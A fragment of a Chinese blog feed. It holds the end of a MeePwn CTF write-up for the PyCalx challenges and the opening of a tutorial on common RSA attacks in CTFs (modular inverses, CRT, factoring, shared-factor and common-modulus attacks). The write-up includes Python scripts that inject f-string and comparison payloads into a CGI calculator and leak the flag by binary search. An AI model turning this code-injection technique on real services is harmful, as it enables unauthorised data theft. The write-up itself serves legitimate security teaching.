class="string">''</span></span><br><span class="line">v1, v2, op, s = <span class="string">'x'</span>, <span class="string">"+FLAG&lt;value1+source#"</span>, <span class="string">"+'"</span>, <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    flag += chr(bin_search() - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">print</span> flag</span><br><span class="line"><span class="comment"># MeePwnCTF&#123;python3.66666666666666_([_((you_passed_this?]]]]]])&#125;</span></span><br></pre></td></tr></table></figure><p><img src="1531905259492.png" alt="1531905259492"></p><h1 id="PyCalx2"><a href="#PyCalx2" class="headerlink" title="PyCalx2"></a>PyCalx2</h1><blockquote><p>You should solve <code>PyCalx</code> first. </p><p><a href="http://206.189.223.3/cgi-bin/server.py?source=1" target="_blank" rel="noopener">http://206.189.223.3/cgi-bin/server.py?source=1</a>  </p></blockquote><p><code>server.py</code> 只改动了一行代码，将<code>op = get_op(arguments[&#39;op&#39;].value)</code> 变成了 <code>op = get_op(get_value(arguments[&#39;op&#39;].value))</code>  ，也就是说将<code>op</code> 参数也进行了黑名单过滤，于是 <code>op</code> 的第二个字符就不能是单引号，第一题的方法也就失效了。</p><p>结合题目提示和第一题的flag去寻找Python3.6的新特性，用到了这个 <code>f-string</code> ，详见<a href="https://www.python.org/dev/peps/pep-0498/" target="_blank" rel="noopener">PEP 498 – Literal String Interpolation</a> 。简言之就是可以在字符串中方便地直接插入表达式，以<code>f</code> 开头，表达式插在大括号<code>{}</code> 里，在运行时表达式会被计算并替换成对应的值。</p><p>本题主要是利用这个特性在字符串里插入比较的表达式，剩下的就和上题一样了。插法不尽相同，CTF Time上的WP里有这么两种，相信还可以有其他的方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>str(repr(<span class="string">'T'</span>))+str(<span class="string">'+f'</span>)+str(repr(<span class="string">'ru&#123;FLAG&lt;source or 14:x&#125;'</span>)) <span class="comment"># 14的十六进制表示时'e'</span></span><br><span class="line"><span class="string">"'T'+f'ru&#123;FLAG&lt;source or 14:x&#125;'"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>eval(str(repr(<span class="string">'T'</span>))+str(<span class="string">'+f'</span>)+str(repr(<span class="string">'ru&#123;1 or 14:x&#125;'</span>)))</span><br><span class="line"><span class="string">'Tru1'</span> <span class="comment"># 返回Invalid</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>eval(str(repr(<span class="string">'T'</span>))+str(<span class="string">'+f'</span>)+str(repr(<span class="string">'ru&#123;0 or 14:x&#125;'</span>)))</span><br><span class="line"><span class="string">'True'</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>str(repr(<span class="string">'Tru'</span>))+str(<span class="string">'+f'</span>)+str(repr(<span class="string">'&#123;sys.exit.__name__:&#123;FLAG&lt;source:1&#125;.1&#125;'</span>))</span><br><span class="line"><span class="string">"'Tru'+f'&#123;sys.exit.__name__:&#123;FLAG&lt;source:1&#125;.1&#125;'"</span></span><br><span class="line"><span class="comment"># &#123;FLAG&lt;source:1&#125;的值相当于printf("%1f",FLAG&lt;source)的结果，有0和1两种可能。</span></span><br><span class="line"><span class="comment">#这边sys.exit.__name__等价于字符串'exit'，考虑到已经import escape，直接用escape.__name__也可。</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>eval(str(repr(<span class="string">'Tru'</span>))+str(<span class="string">'+f'</span>)+str(repr(<span class="string">'&#123;sys.exit.__name__:&#123;1:1&#125;.1&#125;'</span>)))</span><br><span class="line"><span class="string">'True'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>eval(str(repr(<span class="string">'Tru'</span>))+str(<span class="string">'+f'</span>)+str(repr(<span class="string">'&#123;sys.exit.__name__:&#123;0:1&#125;.1&#125;'</span>)))</span><br><span class="line"><span class="comment">#报错，返回Invalid</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">"&lt;string&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ValueError: <span class="string">'='</span> alignment <span class="keyword">not</span> allowed <span class="keyword">in</span> string format specifier</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(v1, v2, op, s)</span>:</span></span><br><span class="line">    u = <span class="string">"http://206.189.223.3/cgi-bin/server.py?"</span></span><br><span class="line">    payload = dict(value1=v1, value2=v2, op=op, source=s)</span><br><span class="line">    r = requests.get(u, params=payload)</span><br><span class="line">    res = re.findall(<span class="string">"&lt;pre&gt;\n&gt;&gt;&gt;&gt;([\s\S]*)\n&gt;&gt;&gt; &lt;\/pre&gt;"</span>,</span><br><span class="line">                     r.content)[<span class="number">0</span>].split(<span class="string">'\n'</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> res == <span class="string">'Invalid'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(mid)</span>:</span></span><br><span class="line">    s = flag + chr(mid)</span><br><span class="line">    <span class="keyword">return</span> calc(v1, v2, op, s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin_search</span><span class="params">(seq=xrange<span class="params">(<span class="number">0x20</span>, <span class="number">0x80</span>)</span>, lo=<span class="number">0</span>, hi=None)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> (lo &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> hi == <span class="keyword">None</span>: hi = len(seq)</span><br><span class="line">    <span class="keyword">while</span> lo &lt; hi:</span><br><span class="line">        mid = (lo + hi) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> check(seq[mid]): hi = mid</span><br><span class="line">        <span class="keyword">else</span>: lo = mid + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> seq[lo]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">v1, op, v2, s = <span class="string">'T'</span>, <span class="string">"+f"</span>, <span class="string">"ru&#123;FLAG&lt;source or 14:x&#125;"</span>, <span class="string">'a'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    flag += chr(bin_search() - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">print</span> flag</span><br><span class="line"><span class="comment"># MeePwnCTF&#123;python3.6[_strikes_backkkkkkkkkkkk)&#125;</span></span><br></pre></td></tr></table></figure><p><img src="1531905207979.png" alt="1531905207979"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;本文首发 &lt;a href=&quot;https://xz.aliyun.com/t/2446&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;先知社区&lt;/a&gt; ，转载请注明链接。&lt;/strong&gt; &lt;/p&gt;
&lt;h1 id=&quot;PyCalx&quot;&gt;&lt;a hr
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CTF中常见的RSA相关问题总结</title>
    <link href="https://findneo.github.io/180727rsa-attack/"/>
    <id>https://findneo.github.io/180727rsa-attack/</id>
    <published>2018-07-15T11:41:04.000Z</published>
    <updated>2019-01-25T23:21:37.054Z</updated>
    
    <content type="html"><![CDATA[<p><strong>本文首发<a href="https://xz.aliyun.com/t/2446" target="_blank" rel="noopener">先知社区</a> ，转载请注明链接。</strong> </p><h1 id="CTF中常见的RSA相关问题总结"><a href="#CTF中常见的RSA相关问题总结" class="headerlink" title="CTF中常见的RSA相关问题总结"></a>CTF中常见的RSA相关问题总结</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​理解基本概念后，代码就可以说明一切，所以本文将每种攻击方式的实现方法都提炼成了一个函数，在理解原理时会有帮助，在需要时也可以直接调用。</p><h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h2 id="RSA概要"><a href="#RSA概要" class="headerlink" title="RSA概要"></a>RSA概要</h2><p>在开始前可以通过 <a href="http://www.guideep.com/read?guide=5676830073815040" target="_blank" rel="noopener">《RSA算法详解》</a> 这篇文章了解关于RSA的基础知识，包括加解密方法，算法原理和可行性证明等。</p><h2 id="应用流程"><a href="#应用流程" class="headerlink" title="应用流程"></a>应用流程</h2><ol><li>选取两个较大的互不相等的质数p和q，计算<code>n = p * q</code> 。</li><li>计算<code>phi = (p-1) * (q-1)</code> 。</li><li>选取任意e，使得e满足 <code>1&lt;e&lt;phi</code> 且 <code>gcd(e , phi) == 1</code> 。</li><li>计算e关于 phi 的模逆元d， 即d满足<code>(e * d)% phi ==1</code>  。</li><li>加解密：<code>c = (m ^ e) % n</code> ， <code>m = (c ^ d) % n</code> 。其中m为明文，c为密文，(n,e)为公钥对，d为私钥，要求 <code>0 &lt;= m &lt; n</code> 。</li></ol><h2 id="理解模逆运算"><a href="#理解模逆运算" class="headerlink" title="理解模逆运算"></a>理解模逆运算</h2><ul><li>如果<code>(a*b)%c==1</code> ，那么a和b互为对方模c的模逆元/数论倒数，也写作<img src="1531107643807.png" alt="mod_inv"> 。</li><li>关于最大公约数有一个基本事实：<code>给予两整数a、c，必存在整数x、y使得ax + cy = gcd(a,c)</code>  ，基于这个事实，当a,c互素即<code>gcd(a,c)==1</code> 时，有<code>ax+cy=1</code> ，那么就有<code>(a*x)%c==1</code> ，所以x就是a 对c的模逆元。因此，a对c存在模逆元b的充要条件是<code>gcd(a,c)==1</code> 。显然对于每一组<code>a,c</code> ，存在一族满足条件的x，在求模逆元时我们取得是最小正整数解<code>x mod n</code> 。</li><li>上述的基本事实很容易理解，因为a和c的最大公约数是gcd(a,b)，所以a和c都可表示为gcd(a,b)的整数倍，那么a和b的任意整系数的线性组合ax+by也必定能表示成gcd(a,c)的整数倍，他们当中最小的正整数就应该是gcd(a,c)。实际上最大公约数有一个定义就是：<code>a和b的最大公约数g是a和b的线性和中的最小正整数</code>  。</li></ul><ul><li><p>求模逆元主要基于扩展欧几里得算法，贴一个Python实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">egcd</span> <span class="params">( a , b )</span>:</span></span><br><span class="line">     <span class="keyword">if</span> (b == <span class="number">0</span>):</span><br><span class="line">         <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">         x , y , q = egcd( b , a % b ) <span class="comment"># q = GCD(a, b) = GCD(b, a%b)</span></span><br><span class="line">         x , y = y, ( x - (a // b) * y )</span><br><span class="line">         <span class="keyword">return</span> x, y, q </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mod_inv</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> egcd(a,b)[<span class="number">0</span>]%b <span class="comment">#求a模b得逆元</span></span><br></pre></td></tr></table></figure></li></ul><ul><li>求模逆也可直接利用gmpy2库。如 <code>import gmpy2;print gmpy2.invert(47,30)</code> 可求得47模30的逆为23。<h2 id="模意义下的运算法则"><a href="#模意义下的运算法则" class="headerlink" title="模意义下的运算法则"></a>模意义下的运算法则</h2></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(a + b) % n ≡ (a % n + b % n) % n</span><br><span class="line">(a - b) % n ≡ (a % n - b % n) % n</span><br><span class="line">(a * b) % n ≡ (a % n * b % n) % n</span><br><span class="line">(a ^ b) % n ≡ ((a % n) ^ b) % n <span class="comment">//幂运算</span></span><br><span class="line"></span><br><span class="line">若 a ≡ b(mod n) ,则</span><br><span class="line"><span class="number">1.</span>对于任意正整数c,有a^c ≡ b^c(mod n)</span><br><span class="line"><span class="number">2.</span>对于任意整数c,有ac ≡ bc(mod n),a+c ≡ b+c(mod n),</span><br><span class="line"><span class="number">3.</span>若 c ≡ d(mod n),则a-c ≡ b-d(mod n),a+c ≡ b+d(mod n),ac ≡ bd(mod n)</span><br><span class="line"></span><br><span class="line">如果ac≡bc (mod m)，且c和m互质，则a≡b (mod m）。</span><br><span class="line">[理解：当且仅当c和m互质,c^<span class="number">-1</span>存在,等式左右可同乘模逆。]</span><br><span class="line"></span><br><span class="line">除法规则：</span><br><span class="line">在模n意义下，a/b不再仅仅代表这两个数相除，而是指 a+k1*n 和 b+k2*n这两个组数中任意两个相除，使商为整数</span><br><span class="line">因此也就可以理解，除以一个数等价于乘以它的逆</span><br><span class="line">a/b ≡ c(mod n) &lt;=&gt; a ≡ c*(b^<span class="number">-1</span>) (mod n)，其中b模n的逆记作b的负一次方。</span><br><span class="line"></span><br><span class="line">费马小定理:</span><br><span class="line">a是整数,p是质数,则a^p==a(mod p),如果a不是p的倍数,还有a^(p<span class="number">-1</span>) ≡ <span class="number">1</span>(mod p)</span><br></pre></td></tr></table></figure><p>推荐文章 <a href="https://blog.sengxian.com/algorithms/mod-world" target="_blank" rel="noopener">模运算总结</a> 和 <a href="https://github.com/wujr5/algorithm-analysis-and-design/blob/master/relative-algorithm-learning/6-algorithm-about-modulo-operation.md" target="_blank" rel="noopener">取模运算涉及的算法</a> 。</p><h2 id="欧几里得算法"><a href="#欧几里得算法" class="headerlink" title="欧几里得算法"></a>欧几里得算法</h2><p>欧几里得算法是求最大公约数的算法, 也就是中学学的 <a href="https://zh.wikipedia.org/wiki/%E8%BC%BE%E8%BD%89%E7%9B%B8%E9%99%A4%E6%B3%95" target="_blank" rel="noopener">辗转相除法</a> 。记 <code>gcd(a,b)</code> 为a和b的最大公约数，欧几里得算法的基本原理是<code>gcd(a,b)==gcd(b,a%b),(b!=0)</code>  和 <code>gcd(a,0)==a</code> 。</p><p>Python实现如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 递归版</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> a <span class="keyword">if</span> <span class="keyword">not</span> b <span class="keyword">else</span> gcd(b, a % b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 迭代版</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd2</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a % b</span><br><span class="line">    <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure><h2 id="扩展欧几里得算法"><a href="#扩展欧几里得算法" class="headerlink" title="扩展欧几里得算法"></a>扩展欧几里得算法</h2><p>扩展欧几里得算法基于欧几里得算法，能够求出使得 <code>ax+by=gcd(a,b)</code> 的一组x,y。</p><p><a href="http://blog.miskcoo.com/2014/09/chinese-remainder-theorem#i-3" target="_blank" rel="noopener">这篇文章</a> 解释得很到位，对照下图和以下递归版实现容易理解。</p><p><img src="1531578488892.png" alt="ext_euclid"></p><p>Python实现如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 递归版</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ext_euclid</span> <span class="params">( a , b )</span>:</span></span><br><span class="line">    <span class="comment"># ref:https://zh.wikipedia.org/wiki/扩展欧几里得算法</span></span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x1 , y1 , q = ext_euclid( b , a % b ) <span class="comment"># q = GCD(a, b) = GCD(b, a%b)</span></span><br><span class="line">        x , y = y1, ( x1 - (a // b) * y1 )</span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br><span class="line"><span class="comment"># 迭代版</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="comment"># ref:https://blog.csdn.net/wyf12138/article/details/60476773</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>, <span class="number">0</span>, a)</span><br><span class="line">    x, y = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    s1, s2 = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    r, q = a % b, a / b</span><br><span class="line">    <span class="keyword">while</span> r:</span><br><span class="line">        m, n = x, y</span><br><span class="line">        x = s1 - x * q</span><br><span class="line">        y = s2 - y * q</span><br><span class="line">        s1, s2 = m, n</span><br><span class="line">        a, b = b, r</span><br><span class="line">        r, q = a % b, a / b</span><br><span class="line">    <span class="keyword">return</span> (x, y, b)</span><br></pre></td></tr></table></figure><h2 id="中国剩余定理"><a href="#中国剩余定理" class="headerlink" title="中国剩余定理"></a>中国剩余定理</h2><p><a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86" target="_blank" rel="noopener">维基百科</a> 给出了简洁生动的说明:</p><p><img src="1531585006464.png" alt="CRT"></p><p>参考以上说明进行的Python实现:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="comment"># mi,ai分别表示模数和取模后的值,都为列表结构</span></span><br><span class="line">    <span class="comment"># Chinese Remainder Theorem</span></span><br><span class="line">    <span class="comment"># lcm=lambda x , y:x*y/gcd(x,y)</span></span><br><span class="line">    <span class="comment"># mul=lambda x , y:x*y</span></span><br><span class="line">    <span class="comment"># assert(reduce(mul,mi)==reduce(lcm,mi))</span></span><br><span class="line">    <span class="comment"># 以上可用于保证mi两两互质</span></span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    M = reduce(<span class="keyword">lambda</span> x, y: x * y, mi)</span><br><span class="line">    ai_ti_Mi = [a * (M / m) * gmpy2.invert(M / m, m) <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi, ai)]</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x + y, ai_ti_Mi) % M</span><br></pre></td></tr></table></figure><p>以上程序将mi当作两两互质处理,实际上有时会遇到其他情况，这时就需要逐一两两合并方程组。我参照下图实现了一个互质与不互质两种情况下都能工作良好的中国剩余定理（解同余方程组）的Python程序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="comment"># mi,ai分别表示模数和取模后的值,都为列表结构</span></span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = gmpy2.gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>) <span class="comment">#不成立则不存在解</span></span><br><span class="line">        K = c / d * gmpy2.invert(curm / d, m / d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m / d</span><br><span class="line">        cura %= curm</span><br><span class="line">    <span class="keyword">return</span> (cura % curm, curm) <span class="comment">#(解,最小公倍数)</span></span><br></pre></td></tr></table></figure><p>图片截自  <a href="https://blog.csdn.net/qq_29980371/article/details/71053219" target="_blank" rel="noopener">中国剩余定理（互质与不互质的情况）</a> 。</p><p><img src="1531591884497.png" alt="CRT2"></p><h1 id="常见攻击方式实践"><a href="#常见攻击方式实践" class="headerlink" title="常见攻击方式实践"></a>常见攻击方式实践</h1><h2 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h2><ul><li>python<ul><li>gmpy2库<ul><li>Windows：可从<a href="https://pypi.org/project/gmpy2/#files" target="_blank" rel="noopener">https://pypi.org/project/gmpy2/#files</a> 直接下载已编译的安装包。</li><li>Linux：  <code>sudo apt install python-gmpy2</code> </li></ul></li><li>libnum库：<ul><li><code>git clone https://github.com/hellman/libnum.git &amp;&amp; cd libnum &amp;&amp; python setup.py install</code> </li></ul></li></ul></li><li>yafu<ul><li><a href="https://sourceforge.net/projects/yafu/" target="_blank" rel="noopener">https://sourceforge.net/projects/yafu/</a> </li></ul></li><li>RSATool2v17.exe</li></ul><h2 id="RSA解密"><a href="#RSA解密" class="headerlink" title="RSA解密"></a>RSA解密</h2><p>若已知私钥d，则可以直接解密： <code>m=pow(c,d,n)</code> 。</p><p>若已知质数p和q，则通过依次计算欧拉函数值phi、私钥d可解密。简易实现如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rsa_decrypt</span><span class="params">(e, c, p, q)</span>:</span></span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = gmpy2.invert(e, phi) <span class="comment">#求e模phi的逆</span></span><br><span class="line">        <span class="keyword">return</span> pow(c, d, n)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"e and phi are not coprime!"</span></span><br><span class="line">        <span class="keyword">raise</span> e</span><br></pre></td></tr></table></figure><p>在选取加密指数e时要求phi，e互质，也就是<code>gcd(phi,e)==1</code> ，如果不满足是无法直接解密的。</p><p>为什么说这个呢？是因为有时会有乍一看有点奇怪的情况。比如SCTF2018的<code>Crypto - a number problem</code> ，题目是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x**<span class="number">33</span>=<span class="number">1926041757553905692219721422025224638913707</span> mod <span class="number">3436415358139016629092568198745009225773259</span></span><br><span class="line">tell me the smallest answer of x</span><br></pre></td></tr></table></figure><p>其中<code>n=3436415358139016629092568198745009225773259</code> 可以直接分解得到p,q，出<code>phi=(p-1)*(q-1)</code> ，然后惊奇地发现<code>gcd(phi,33)==3</code> 。这时如果对加密过程比较熟悉的话，就可以想到实际上公钥<code>e=11</code> ，明文是<code>m=x^3</code> ，应该先求出m。然后再爆破x。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000000</span>):</span><br><span class="line">    <span class="comment"># 推荐使用gmpy2库运算，用pow开立方不可行</span></span><br><span class="line">    <span class="keyword">if</span> gmpy2.iroot(m + i * n, <span class="number">3</span>)[<span class="number">1</span>]:</span><br><span class="line">        x = gmpy2.iroot(m + i * n, <span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># i==243277,x==9420391510958023</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="查询已知的n的可分解情况"><a href="#查询已知的n的可分解情况" class="headerlink" title="查询已知的n的可分解情况"></a>查询已知的n的可分解情况</h2><p>在线查询：<a href="https://factordb.com/" target="_blank" rel="noopener">https://factordb.com/</a> </p><p>api接口：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http://factordb.com/api?query=12345</span><br><span class="line">response:</span><br><span class="line">&#123;"id":"12345","status":"FF","factors":[["3",1],["5",1],["823",1]]&#125;</span><br></pre></td></tr></table></figure><h2 id="使用yafu分解N"><a href="#使用yafu分解N" class="headerlink" title="使用yafu分解N"></a>使用yafu分解N</h2><p><strong>适用情况：p,q相差较大或较小时可快速分解。</strong></p><p>使用方法：<code>yafu-x64.exe factor(233)</code>  ，<code>yafu-x64.exe help</code></p><h2 id="模不互素-（gcd-N1-N2-1）"><a href="#模不互素-（gcd-N1-N2-1）" class="headerlink" title="模不互素    （gcd(N1,N2)!=1）"></a>模不互素    （<code>gcd(N1,N2)!=1</code>）</h2><p><strong>适用情况：存在两个或更多模数 ，且<code>gcd(N1,N2)!=1</code> 。</strong></p><p>多个模数n共用质数，则可以很容易利用欧几里得算法求得他们的质因数之一<code>gcd(N1,N2)</code>  ，然后这个最大公约数可用于分解模数分别得到对应的p和q，即可进行解密。实现参照本文<code>欧几里得算法</code> 部分和<code>RSA解密</code> 部分。</p><h2 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h2><p><strong>适用情况：明文m、模数n相同，公钥指数e、密文c不同，<code>gcd(e1,e2)==1</code></strong> </p><p>对同一明文的多次加密使用相同的模数和不同的公钥指数可能导致共模攻击。简单证明见代码注释。</p><p>Python实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">common_modulus</span><span class="params">(n, e1, e2, c1, c2)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    ref: https://crypto.stackexchange.com/questions/16283/how-to-use-common-modulus-attack</span></span><br><span class="line"><span class="string">    